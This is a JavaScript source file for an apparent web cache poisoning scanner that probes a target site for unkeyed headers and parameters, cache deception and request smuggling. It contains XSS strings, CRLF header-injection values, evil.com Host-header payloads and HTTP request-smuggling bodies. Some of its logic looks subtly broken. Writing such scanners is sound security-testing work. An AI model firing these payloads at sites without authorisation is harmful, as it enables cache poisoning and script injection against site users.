const axios = require('axios');
const { URL } = require('url');
const Logger = require('../utils/logger');
const fs = require('fs').promises;
const crypto = require('crypto');

class CacheAnalyzer {
  constructor() {
    this.logger = new Logger();
    this.vulnerabilities = [];
    this.cacheResults = new Map();
    this.startTime = null;
    this.testedHeaders = new Set();
    this.testedParameters = new Set();
  }

  async analyze(options) {
    this.startTime = Date.now();
    const { url, payloads } = options;
    
    this.logger.scanBanner('CACHE POISONING', url);
    this.logger.logScanStart(url, 'Cache Poisoning Analysis');

    try {
      // Phase 1: Cache Infrastructure Detection
      this.logger.info('🔍 Phase 1: Cache Infrastructure Detection');
      const cacheInfo = await this.detectCacheInfrastructure(url);
      
      // Phase 2: Unkeyed Input Discovery
      this.logger.info('🔑 Phase 2: Unkeyed Input Discovery');
      const unkeyedInputs = await this.discoverUnkeyedInputs(url);
      
      // Phase 3: Cache Key Analysis
      this.logger.info('🗝️ Phase 3: Cache Key Analysis');
      const cacheKeyInfo = await this.analyzeCacheKeys(url);
      
      // Phase 4: Cache Poisoning Tests
      this.logger.info('☠️ Phase 4: Cache Poisoning Tests');
      await this.runCachePoisoningTests(url, unkeyedInputs);
      
      // Phase 5: Advanced Cache Manipulation
      this.logger.info('🧪 Phase 5: Advanced Cache Manipulation');
      await this.testAdvancedCacheManipulation(url, unkeyedInputs);
      
      // Phase 6: Jamstack/SSG Specific Tests
      this.logger.info('⚡ Phase 6: Jamstack/SSG Cache Tests');
      await this.testJamstackCachePoisoning(url);
      
      // Generate results
      const results = await this.generateResults(url, cacheInfo, unkeyedInputs, cacheKeyInfo);
      
      this.logger.logScanComplete(url, 'Cache Poisoning Analysis', results);
      this.logger.generateSummary(results);
      
      return results;
      
    } catch (error) {
      this.logger.error('Cache analysis failed', { error: error.message, stack: error.stack });
      throw error;
    }
  }

  async detectCacheInfrastructure(url) {
    this.logger.info('🔍 Detecting cache infrastructure...');
    
    const cacheInfo = {
      servers: [],
      headers: {},
      cdns: [],
      technologies: []
    };

    try {
      const response = await axios.get(url, {
        timeout: 10000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)',
          'Accept': '*/*',
          'Accept-Encoding': 'gzip, deflate'
        }
      });

      const headers = response.headers;
      cacheInfo.headers = headers;

      // Detect common cache servers
      const cacheIndicators = {
        'Cloudflare': ['cf-ray', 'cf-cache-status', 'server'],
        'Fastly': ['fastly-debug-digest', 'x-served-by', 'x-cache'],
        'Varnish': ['x-varnish', 'via'],
        'AWS CloudFront': ['x-amz-cf-id', 'x-amz-cf-pop'],
        'KeyCDN': ['x-edge-location', 'x-cache'],
        'MaxCDN': ['x-cache', 'x-edge-location'],
        'Akamai': ['akamai-origin-hop', 'x-akamai-transformed'],
        'Nginx': ['server'],
        'Apache': ['server']
      };

      for (const [technology, headerKeys] of Object.entries(cacheIndicators)) {
        for (const headerKey of headerKeys) {
          if (headers[headerKey]) {
            const headerValue = headers[headerKey].toLowerCase();
            
            if (technology === 'Cloudflare' && (headerValue.includes('cloudflare') || headers['cf-ray'])) {
              cacheInfo.servers.push('Cloudflare');
              cacheInfo.cdns.push('Cloudflare');
            } else if (technology === 'Fastly' && headerValue.includes('fastly')) {
              cacheInfo.servers.push('Fastly');
              cacheInfo.cdns.push('Fastly');
            } else if (technology === 'Varnish' && headerValue.includes('varnish')) {
              cacheInfo.servers.push('Varnish');
            } else if (technology === 'AWS CloudFront' && headers['x-amz-cf-id']) {
              cacheInfo.servers.push('AWS CloudFront');
              cacheInfo.cdns.push('AWS CloudFront');
            } else if (technology === 'Nginx' && headerValue.includes('nginx')) {
              cacheInfo.servers.push('Nginx');
            } else if (technology === 'Apache' && headerValue.includes('apache')) {
              cacheInfo.servers.push('Apache');
            }
          }
        }
      }

      // Analyze cache-related headers
      if (headers['cache-control']) {
        cacheInfo.cacheControl = headers['cache-control'];
      }
      if (headers['etag']) {
        cacheInfo.etag = headers['etag'];
      }
      if (headers['last-modified']) {
        cacheInfo.lastModified = headers['last-modified'];
      }
      if (headers['vary']) {
        cacheInfo.vary = headers['vary'];
      }
      if (headers['x-cache']) {
        cacheInfo.xCache = headers['x-cache'];
      }

      this.logger.info(`✅ Cache infrastructure detected: ${cacheInfo.servers.join(', ') || 'None detected'}`);
      
    } catch (error) {
      this.logger.warn(`Failed to detect cache infrastructure: ${error.message}`);
    }

    return cacheInfo;
  }

  async discoverUnkeyedInputs(url) {
    this.logger.info('🔑 Discovering unkeyed inputs...');
    
    const unkeyedInputs = {
      headers: [],
      parameters: [],
      methods: []
    };

    // Common headers that are often unkeyed
    const testHeaders = [
      'X-Forwarded-Host',
      'X-Forwarded-Proto',
      'X-Forwarded-For',
      'X-Forwarded-Scheme',
      'X-Original-URL',
      'X-Rewrite-URL',
      'X-Host',
      'Host',
      'X-HTTP-Method-Override',
      'X-Method-Override',
      'X-Requested-With',
      'Origin',
      'Referer',
      'User-Agent',
      'Accept',
      'Accept-Language',
      'Accept-Encoding',
      'Accept-Charset',
      'Authorization',
      'Cookie',
      'X-Custom-Header',
      'X-Debug',
      'X-Test'
    ];

    // Test each header to see if it affects caching
    for (let i = 0; i < testHeaders.length; i++) {
      const header = testHeaders[i];
      this.logger.progress(i + 1, testHeaders.length, 'Testing Headers');
      
      try {
        const isUnkeyed = await this.testHeaderUnkeyed(url, header);
        if (isUnkeyed) {
          unkeyedInputs.headers.push(header);
          this.testedHeaders.add(header);
          this.logger.info(`🔓 Unkeyed header found: ${header}`);
        }
      } catch (error) {
        this.logger.debug(`Failed to test header ${header}: ${error.message}`);
      }
    }

    // Test URL parameters
    const testParams = [
      'debug',
      'test',
      'cache',
      'version',
      'callback',
      'jsonp',
      'format',
      'lang',
      'locale',
      'theme',
      'skin',
      'utm_source',
      'utm_medium',
      'utm_campaign',
      'fbclid',
      'gclid'
    ];

    for (let i = 0; i < testParams.length; i++) {
      const param = testParams[i];
      this.logger.progress(i + 1, testParams.length, 'Testing Parameters');
      
      try {
        const isUnkeyed = await this.testParameterUnkeyed(url, param);
        if (isUnkeyed) {
          unkeyedInputs.parameters.push(param);
          this.testedParameters.add(param);
          this.logger.info(`🔓 Unkeyed parameter found: ${param}`);
        }
      } catch (error) {
        this.logger.debug(`Failed to test parameter ${param}: ${error.message}`);
      }
    }

    this.logger.info(`✅ Unkeyed input discovery complete. Found ${unkeyedInputs.headers.length} headers, ${unkeyedInputs.parameters.length} parameters`);
    
    return unkeyedInputs;
  }

  async testHeaderUnkeyed(url, headerName) {
    const uniqueValue1 = crypto.randomBytes(16).toString('hex');
    const uniqueValue2 = crypto.randomBytes(16).toString('hex');

    try {
      // Make first request with unique header value
      const response1 = await axios.get(url, {
        timeout: 5000,
        headers: {
          [headerName]: uniqueValue1,
          'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
        }
      });

      // Wait a moment
      await new Promise(resolve => setTimeout(resolve, 100));

      // Make second request with different header value
      const response2 = await axios.get(url, {
        timeout: 5000,
        headers: {
          [headerName]: uniqueValue2,
          'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
        }
      });

      // If responses are identical and cached, the header is likely unkeyed
      const response1Hash = crypto.createHash('md5').update(response1.data).digest('hex');
      const response2Hash = crypto.createHash('md5').update(response2.data).digest('hex');

      // Check cache headers to confirm caching
      const isCached = response2.headers['x-cache']?.includes('HIT') || 
                      response2.headers['cf-cache-status'] === 'HIT' ||
                      response2.headers['x-served-by'];

      return response1Hash === response2Hash && isCached;

    } catch (error) {
      return false;
    }
  }

  async testParameterUnkeyed(url, paramName) {
    const uniqueValue1 = crypto.randomBytes(8).toString('hex');
    const uniqueValue2 = crypto.randomBytes(8).toString('hex');

    try {
      const testUrl1 = new URL(url);
      testUrl1.searchParams.set(paramName, uniqueValue1);

      const testUrl2 = new URL(url);
      testUrl2.searchParams.set(paramName, uniqueValue2);

      // Make first request
      const response1 = await axios.get(testUrl1.href, {
        timeout: 5000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
        }
      });

      // Wait a moment
      await new Promise(resolve => setTimeout(resolve, 100));

      // Make second request
      const response2 = await axios.get(testUrl2.href, {
        timeout: 5000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
        }
      });

      // Check if responses are identical despite different parameter values
      const response1Hash = crypto.createHash('md5').update(response1.data).digest('hex');
      const response2Hash = crypto.createHash('md5').update(response2.data).digest('hex');

      const isCached = response2.headers['x-cache']?.includes('HIT') || 
                      response2.headers['cf-cache-status'] === 'HIT';

      return response1Hash === response2Hash && isCached;

    } catch (error) {
      return false;
    }
  }

  async analyzeCacheKeys(url) {
    this.logger.info('🗝️ Analyzing cache keys...');
    
    const cacheKeyInfo = {
      varyHeader: null,
      keyComponents: [],
      normalization: {}
    };

    try {
      const response = await axios.get(url, {
        timeout: 5000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
        }
      });

      // Analyze Vary header
      if (response.headers['vary']) {
        cacheKeyInfo.varyHeader = response.headers['vary'];
        cacheKeyInfo.keyComponents = response.headers['vary'].split(',').map(h => h.trim());
      }

      // Test cache key normalization
      await this.testCacheKeyNormalization(url, cacheKeyInfo);

    } catch (error) {
      this.logger.debug(`Failed to analyze cache keys: ${error.message}`);
    }

    return cacheKeyInfo;
  }

  async testCacheKeyNormalization(url, cacheKeyInfo) {
    // Test different URL formats to see how they're normalized
    const testUrls = [
      url,
      url + '/',
      url.replace('http://', 'https://').replace('https://', 'http://'),
      url + '?',
      url + '#fragment'
    ];

    for (const testUrl of testUrls) {
      try {
        const response = await axios.get(testUrl, {
          timeout: 5000,
          validateStatus: () => true
        });

        const cacheKey = response.headers['x-cache-key'] || 
                         response.headers['x-varnish'] || 
                         'unknown';
        
        cacheKeyInfo.normalization[testUrl] = cacheKey;

      } catch (error) {
        // Ignore errors
      }
    }
  }

  async runCachePoisoningTests(url, unkeyedInputs) {
    this.logger.info('☠️ Running cache poisoning tests...');

    const testCases = [];
    
    // Generate test cases for each unkeyed input
    for (const header of unkeyedInputs.headers) {
      testCases.push({
        type: 'header',
        name: header,
        payloads: this.getCachePoisoningPayloads(header)
      });
    }

    for (const param of unkeyedInputs.parameters) {
      testCases.push({
        type: 'parameter',
        name: param,
        payloads: this.getCachePoisoningPayloads(param)
      });
    }

    // Run tests
    for (let i = 0; i < testCases.length; i++) {
      const testCase = testCases[i];
      this.logger.progress(i + 1, testCases.length, 'Cache Poisoning Tests');
      
      await this.runSingleCachePoisoningTest(url, testCase);
    }
  }

  getCachePoisoningPayloads(inputName) {
    const payloads = [];

    // XSS payloads for cache poisoning
    if (inputName.toLowerCase().includes('host') || inputName.toLowerCase().includes('origin')) {
      payloads.push(
        'evil.com',
        'attacker.com"><script>alert("XSS")</script>',
        'localhost:8080',
        '127.0.0.1:8080'
      );
    }

    // Header injection payloads
    if (inputName.toLowerCase().includes('forward') || inputName.toLowerCase().includes('host')) {
      payloads.push(
        'example.com\r\nX-Injected-Header: malicious',
        'example.com\nSet-Cookie: poisoned=true',
        'example.com\r\nContent-Type: text/html'
      );
    }

    // Open redirect payloads
    if (inputName.toLowerCase().includes('url') || inputName.toLowerCase().includes('redirect')) {
      payloads.push(
        'https://evil.com',
        '//evil.com',
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>'
      );
    }

    // Generic payloads
    payloads.push(
      '<script>alert("CachePoisoning")</script>',
      '"><img src=x onerror=alert("CachePoisoning")>',
      'javascript:alert("CachePoisoning")',
      '${7*7}',
      '{{7*7}}',
      'test"onmouseover="alert(1)"',
      '<svg onload=alert("CachePoisoning")>'
    );

    return payloads;
  }

  async runSingleCachePoisoningTest(url, testCase) {
    const { type, name, payloads } = testCase;

    for (const payload of payloads) {
      try {
        let testRequest;
        
        if (type === 'header') {
          testRequest = {
            url: url,
            headers: {
              [name]: payload,
              'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
            }
          };
        } else if (type === 'parameter') {
          const testUrl = new URL(url);
          testUrl.searchParams.set(name, payload);
          testRequest = {
            url: testUrl.href,
            headers: {
              'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
            }
          };
        }

        // Make poisoning request
        const poisonResponse = await axios.get(testRequest.url, {
          timeout: 5000,
          headers: testRequest.headers,
          validateStatus: () => true
        });

        // Wait for cache to be populated
        await new Promise(resolve => setTimeout(resolve, 500));

        // Make verification request (without the poisoning input)
        const verifyResponse = await axios.get(url, {
          timeout: 5000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
          },
          validateStatus: () => true
        });

        // Check if payload persisted in cache
        if (verifyResponse.data.includes(payload) || 
            verifyResponse.data.includes(payload.replace(/"/g, '&quot;'))) {
          
          const vulnerability = {
            type: 'Cache Poisoning',
            severity: 'High',
            url: url,
            parameter: `${type}:${name}`,
            payload: payload,
            evidence: 'Payload persisted in cached response',
            response: verifyResponse.data.substring(0, 500),
            confidence: 'High',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logCachePoisoning({
            url: url,
            headers: testRequest.headers,
            payload: payload,
            cached: true
          });
        }

      } catch (error) {
        this.logger.debug(`Cache poisoning test failed: ${error.message}`);
      }
    }
  }

  async testAdvancedCacheManipulation(url, unkeyedInputs) {
    this.logger.info('🧪 Testing advanced cache manipulation...');

    // Test cache deception
    await this.testCacheDeception(url);
    
    // Test HTTP request smuggling for cache poisoning
    await this.testRequestSmugglingCachePoisoning(url);
    
    // Test cache key collision
    await this.testCacheKeyCollision(url, unkeyedInputs);
    
    // Test fat GET requests
    await this.testFatGetRequests(url);
  }

  async testCacheDeception(url) {
    const testPaths = [
      '/admin',
      '/api/user',
      '/private',
      '/.env',
      '/config.json',
      '/admin.php'
    ];

    for (const path of testPaths) {
      try {
        const testUrl = url + path + '?.css';
        
        const response = await axios.get(testUrl, {
          timeout: 5000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
          },
          validateStatus: () => true
        });

        // Check if sensitive content was cached as CSS
        if (response.headers['content-type']?.includes('text/css') && 
            (response.data.includes('password') || 
             response.data.includes('admin') || 
             response.data.includes('secret'))) {
          
          const vulnerability = {
            type: 'Cache Deception',
            severity: 'High',
            url: testUrl,
            parameter: 'URL Path',
            payload: path + '?.css',
            evidence: 'Sensitive content cached as static resource',
            response: response.data.substring(0, 500),
            confidence: 'Medium',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logVulnerability(vulnerability);
        }

      } catch (error) {
        // Ignore errors
      }
    }
  }

  async testRequestSmugglingCachePoisoning(url, unkeyedInputs) {
    // Test CL.TE and TE.CL request smuggling for cache poisoning
    const smugglingPayloads = [
      {
        name: 'CL.TE',
        headers: {
          'Content-Length': '44',
          'Transfer-Encoding': 'chunked'
        },
        body: '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n'
      },
      {
        name: 'TE.CL',
        headers: {
          'Transfer-Encoding': 'chunked',
          'Content-Length': '4'
        },
        body: '5c\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n'
      }
    ];

    for (const payload of smugglingPayloads) {
      try {
        await axios.post(url, payload.body, {
          timeout: 5000,
          headers: {
            ...payload.headers,
            'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
          },
          validateStatus: () => true
        });

        // Check if smuggling affected subsequent requests
        const verifyResponse = await axios.get(url, {
          timeout: 5000,
          validateStatus: () => true
        });

        if (verifyResponse.data.includes('evil.com') || 
            verifyResponse.status === 404) {
          
          const vulnerability = {
            type: 'HTTP Request Smuggling (Cache Poisoning)',
            severity: 'Critical',
            url: url,
            parameter: 'HTTP Headers',
            payload: payload.name,
            evidence: 'Request smuggling affected cached response',
            confidence: 'Medium',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logVulnerability(vulnerability);
        }

      } catch (error) {
        // Ignore errors
      }
    }
  }

  async testCacheKeyCollision(url, unkeyedInputs) {
    // Test if different URLs result in the same cache key
    const variations = [
      url,
      url + '/',
      url.replace(/\/$/, ''),
      url + '?',
      url + '#',
      url.toUpperCase(),
      url.toLowerCase()
    ];

    const responses = new Map();

    for (const variation of variations) {
      try {
        const response = await axios.get(variation, {
          timeout: 5000,
          headers: {
            'X-Test-Collision': crypto.randomBytes(8).toString('hex')
          },
          validateStatus: () => true
        });

        const responseHash = crypto.createHash('md5').update(response.data).digest('hex');
        const cacheKey = response.headers['x-cache-key'] || responseHash;

        if (responses.has(cacheKey) && responses.get(cacheKey) !== variation) {
          const vulnerability = {
            type: 'Cache Key Collision',
            severity: 'Medium',
            url: url,
            parameter: 'URL Variations',
            payload: `${responses.get(cacheKey)} -> ${variation}`,
            evidence: 'Different URLs share same cache key',
            confidence: 'Medium',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logVulnerability(vulnerability);
        }

        responses.set(cacheKey, variation);

      } catch (error) {
        // Ignore errors
      }
    }
  }

  async testFatGetRequests(url) {
    // Test if GET requests with bodies are cached differently
    try {
      const body = JSON.stringify({ malicious: 'payload' });
      
      const response = await axios.get(url, {
        timeout: 5000,
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': body.length.toString()
        },
        data: body,
        validateStatus: () => true
      });

      // Check if the body affected the response
      if (response.data.includes('malicious') || response.data.includes('payload')) {
        const vulnerability = {
          type: 'Fat GET Request Cache Poisoning',
          severity: 'Medium',
          url: url,
          parameter: 'HTTP Body',
          payload: body,
          evidence: 'GET request body affected cached response',
          confidence: 'Medium',
          timestamp: new Date().toISOString()
        };

        this.vulnerabilities.push(vulnerability);
        this.logger.logVulnerability(vulnerability);
      }

    } catch (error) {
      // Ignore errors
    }
  }

  async testJamstackCachePoisoning(url) {
    this.logger.info('⚡ Testing Jamstack/SSG cache poisoning...');

    // Test common Jamstack endpoints
    const jamstackEndpoints = [
      '/.netlify/functions/',
      '/.vercel/functions/',
      '/api/',
      '/_next/static/',
      '/static/',
      '/.next/',
      '/public/',
      '/assets/'
    ];

    for (const endpoint of jamstackEndpoints) {
      try {
        const testUrl = new URL(url);
        testUrl.pathname = endpoint;
        
        const response = await axios.get(testUrl.href, {
          timeout: 5000,
          headers: {
            'X-Forwarded-Host': 'evil.com',
            'X-Original-URL': '/admin',
            'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
          },
          validateStatus: () => true
        });

        // Check for Jamstack-specific vulnerabilities
        if (response.data.includes('evil.com') || 
            response.data.includes('/admin')) {
          
          const vulnerability = {
            type: 'Jamstack Cache Poisoning',
            severity: 'High',
            url: testUrl.href,
            parameter: 'Jamstack Headers',
            payload: 'X-Forwarded-Host: evil.com',
            evidence: 'Jamstack cache poisoning successful',
            response: response.data.substring(0, 500),
            confidence: 'High',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logVulnerability(vulnerability);
        }

      } catch (error) {
        // Ignore errors
      }
    }
  }

  async generateResults(target, cacheInfo, unkeyedInputs, cacheKeyInfo) {
    const duration = Date.now() - this.startTime;
    const results = {
      target,
      timestamp: new Date().toISOString(),
      duration: `${Math.round(duration / 1000)}s`,
      cacheInfrastructure: cacheInfo,
      unkeyedInputs: unkeyedInputs,
      cacheKeyInfo: cacheKeyInfo,
      vulnerabilities: this.vulnerabilities,
      total: this.vulnerabilities.length,
      critical: this.vulnerabilities.filter(v => v.severity === 'Critical').length,
      high: this.vulnerabilities.filter(v => v.severity === 'High').length,
      medium: this.vulnerabilities.filter(v => v.severity === 'Medium').length,
      low: this.vulnerabilities.filter(v => v.severity === 'Low').length,
      info: this.vulnerabilities.filter(v => v.severity === 'Info').length
    };

    return results;
  }
}

module.exports = CacheAnalyzer;